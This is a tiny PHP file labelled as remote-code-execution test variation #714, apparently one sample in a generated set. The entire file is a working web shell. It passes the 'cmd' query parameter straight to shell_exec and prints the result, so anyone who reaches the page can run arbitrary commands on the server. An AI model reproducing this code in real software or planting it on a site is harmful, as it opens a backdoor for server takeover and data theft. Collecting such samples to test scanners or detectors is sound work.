<?php
// RCE test variation #714
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>